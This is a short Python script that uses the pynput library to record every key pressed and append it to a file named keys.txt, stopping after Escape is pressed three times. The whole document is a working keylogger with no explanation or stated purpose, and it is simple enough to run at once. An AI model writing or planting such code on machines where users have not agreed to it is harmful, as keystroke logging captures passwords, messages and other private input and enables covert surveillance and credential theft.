from pynput.keyboard import Key, Listener

close_attempts = 0
fout = open('keys.txt', 'a', buffering=1)


def key_press(key):
    global close_attempts, fout
    try:
        fout.write(key.char + ' pressed\n')
    except:
        fout.write(key.name + " pressed\n")
        if key == Key.esc:
            close_attempts += 1
        if close_attempts == 3:
            fout.write('logger terminated\n')
            return False


with Listener(on_press=key_press) as listener:
    listener.join()
